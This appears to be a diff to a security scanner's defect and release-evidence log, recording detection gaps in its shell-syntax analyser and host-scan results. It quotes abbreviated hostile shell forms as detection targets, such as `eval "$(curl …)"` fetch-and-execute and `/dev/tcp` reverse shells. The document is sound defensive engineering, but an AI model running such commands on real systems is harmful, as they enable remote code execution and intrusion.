@@ -87,6 +87,7 @@ without Hypothesis.
 | P-1b | `shell_syntax.analyze` | Regression of the P-1 fix, caught before release by the evasion probe: NUL stripping ran inside every nested run, so `eval "$(curl …)"` (whose nested text legitimately carries lexer markers) reported `NUL_IN_INPUT`. | probing evasion variants | NUL is stripped at the public entry only |
 | P-8 | `shell_syntax._Analysis` | `eval "$(curl …)"`, `sh -c "$(curl …)"`, `python3 -c "$(curl …)"`, `PROMPT_COMMAND="$(curl …)"` and `bash -c "$(… \| base64 -d)"` produced only a limitation and no pattern: code that arrives through a substitution was not attributed to its source. | probing evasion variants | the source classes emitted by a command's own substitutions feed `_code_from` for eval, `-c` and inline interpreter code |
 | P-9 | `shell_syntax._Analysis` | Reverse shells through `/dev/tcp` (`bash -i >& /dev/tcp/H/P 0>&1`, `exec 3<>/dev/tcp/H/P`) were invisible: `exec` leaves no command word to classify. | probing evasion variants | `NETWORK_REDIRECTION` on any redirection target under `/dev/tcp/` or `/dev/udp/`, checked before wrappers are stripped |
+| P-10 | `shell_syntax._head` | Hypothesis, in the gate of a later pull request: `/tmp/if --arg` produced no pattern. The transparent-wrapper set was matched by basename, so a program named like a reserved word (`if`, `then`, `do`, …) or like a wrapper (`/tmp/nohup`) was stripped as if it were the keyword and never classified. The sibling of P-5 for the other keyword set. | Hypothesis (`test_volatile_executable_is_seen_through_transparent_wrappers`) | reserved words are transparent only as bare words; a wrapper that itself lives in a volatile path is the program to report |
 | P-7 | mypy | 10 type errors were "informational" (`RELEASE_EVIDENCE.json`). Two were real: `install_location`/`signed_state` lookups passed arbitrary JSON values to integer-keyed tables. | `mypy --check-untyped-defs` | typed `Profile`, narrowed lookups; mypy is a CI gate (zero errors) |
 
 Model refinements recorded as negative results (not product defects): the cron
@@ -136,6 +137,10 @@ set and the rule names changed.
 | ID | Where | Refuted claim / impact | Found by | Fix |
 |---|---|---|---|---|
 | CV-1 | `collectors.crossview` | On every live host the check was `PARTIAL` (`READ_FAILED`, `SYMLINK_NOT_FOLLOWED`): `/proc/self` and `/proc/net` are symlinks, which the no-follow reader refuses by design, so mount overlays and `/proc/net` listeners were never read. The fixture hosts have a real `self` directory and could not show it. | the first 0.2.0 scan of a real host | read `/proc/<own pid>/mountinfo` and `/proc/<own pid>/net/*` on a live host; a live test asserts both reads succeed without a gap |
+
+| ID | Where | Refuted claim / impact | Found by | Fix |
+|---|---|---|---|---|
+| D-2 | `collectors.persistence`, `shell_syntax` | `NO_COMPROMISE_INDICATORS_OBSERVED` was unreachable on a stock Ubuntu desktop: the default `~/.bashrc` evaluates `dircolors` and `lesspipe` output, every such line was `PARSE_UNSUPPORTED`, `persistence` was `PARTIAL`, the verdict `INCONCLUSIVE` (both 0.1.3 host runs and both 0.2.0 host runs). A tool whose verdict cannot be reached on its primary platform says nothing by its silence. | the maintainer-host scans | the analyser reports the literal programs whose output an `eval` executes and the number of unresolved sites; when they coincide and every program is package-attested and not a relay, the file carries the scope limit `EVAL_OF_ATTESTED_PROGRAM_OUTPUT` (a stated trust assumption, like `PACKAGE_ATTESTED_NOT_PARSED`). Refuted by: a relay program, an unattested program, a download/decode, a variable in between or any second limitation turning the file `COMPLETED` (tests, validity twins). |
 
 Offline image mode (0.2.0, `--root`): the live-only collectors are declared
 `SKIPPED/LIVE_ONLY_NOT_IN_OFFLINE_IMAGE` and leave the essential set; every
@@ -198,7 +203,7 @@ These are adopted practices. No compliance or certification is claimed.
 | G7 reports consistent, escaped, private | PASS | 0700/0600; CSP; escaping tests; baseline-tamper test |
 | G8 reproducibility | PASS (same environment only) | Two pyz builds and two full ZIP builds are byte-identical on this host. No cross-platform claim. |
 | G9 clean-extraction verification | see release receipt next to the ZIP | |
-| G10 authorised local workflow exercised | PASS (user scope) | standard and deep user-scope runs |
+| G10 authorised local workflow exercised | PASS (user scope) | 0.1.3: standard and deep user-scope runs. 0.2.0: standard (7.0 s) and deep (75.6 s) user-scope runs of the maintainer host after CV-1; all nine checks `COMPLETED` except `persistence` `PARTIAL` (`PARSE_UNSUPPORTED`×5 from `eval "$(…)"` lines of the stock shell start-up, see D-2), hence `INCONCLUSIVE`; 20 exposures (browser native hosts, policies), 2 context findings (dpkg conffiles, missing files), 0 indicators; offline mode exercised on fixture images only |
 | G11 unperformed checks identified | PASS | no system-scope run (no authorisation); hosted CI: the first run on the pushed commit failed (R-3) and is kept as a negative result; the run on the fix is recorded in the release receipt; coverage 89% < 100% target; no malware-corpus validation |
 
 ## Coverage
